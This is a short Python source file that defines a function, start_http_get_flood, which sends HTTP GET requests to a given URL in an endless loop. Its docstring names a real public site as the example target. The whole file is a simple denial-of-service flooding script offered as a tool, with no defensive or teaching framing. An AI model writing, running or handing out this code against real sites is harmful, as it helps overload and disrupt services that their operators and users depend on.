import requests

def start_http_get_flood(destination_URL):
    """Continuously send HTTP GET packets.
    
    Argument:
    destination_URL -- the URL of the target (example: http://www.google.com)

    """
    while True:
        r = requests.get(destination_URL)